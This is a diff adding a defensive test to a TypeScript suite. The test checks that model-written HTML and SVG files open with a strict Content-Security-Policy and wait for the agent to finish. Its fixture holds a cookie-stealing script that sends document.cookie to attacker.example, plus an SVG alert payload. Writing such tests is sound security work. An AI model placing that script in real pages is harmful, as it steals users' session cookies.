@@ -92,3 +92,27 @@ it('HIGH (both reviews): o and s take only a viewable file type, never an execut
   SessionManager.downloads = join(dir, 'no-such-folder');
   await expect(m.addonFile(agent.id, 'out/deck/pitch.html', 'save')).rejects.toThrow('No Downloads folder');
 });
+
+it('MEDIUM (v1.0 gate): o opens model-written HTML and SVG with no script able to run, s saves HTML the same way; nothing opens while the agent runs', async () => {
+  const { dir, m, agent, tree } = await manager(), downloads = join(dir, 'Downloads'), opened: string[] = [];
+  await mkdir(downloads); SessionManager.downloads = downloads; SessionManager.fileOpener = async path => { opened.push(path); };
+  await mkdir(join(tree, 'out', 'deck'), { recursive: true }); await mkdir(join(tree, 'docs', 'diagrams'), { recursive: true });
+  await writeFile(join(tree, 'out', 'deck', 'x.html'), '<!doctype html><html><head><script>fetch("https://attacker.example/?"+document.cookie)</script></head><body>deck</body></html>');
+  await writeFile(join(tree, 'docs', 'diagrams', 'd.svg'), '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
+  await m.addonFile(agent.id, 'out/deck/x.html', 'open');
+  const html = await readFile(opened[0] ?? '', 'utf8');
+  expect(html.indexOf('Content-Security-Policy')).toBeGreaterThan(-1);
+  expect(html.indexOf('Content-Security-Policy')).toBeLessThan(html.indexOf('<script>'));
+  expect(html).toContain("default-src 'none'");
+  await m.addonFile(agent.id, 'docs/diagrams/d.svg', 'open');
+  // An SVG opens inside a page that shows it as an image, where SVG scripts never run.
+  expect(opened[1]?.endsWith('.html')).toBe(true);
+  const page = await readFile(opened[1] ?? '', 'utf8');
+  expect(page).toContain('<img src="d.svg"'); expect(page).toContain("default-src 'none'");
+  const saved = await m.addonFile(agent.id, 'out/deck/x.html', 'save');
+  expect(await readFile(saved ?? '', 'utf8')).toContain("default-src 'none'");
+  // While the agent still runs it could swap its folder for a link between the check and the open (LOW): wait for it.
+  const live = (m as unknown as { sessions: Map<string, { info: SessionInfo }> }).sessions.get(agent.id);
+  if (live) live.info.status = 'running';
+  await expect(m.addonFile(agent.id, 'out/deck/x.html', 'open')).rejects.toThrow('Wait until the agent finishes');
+});
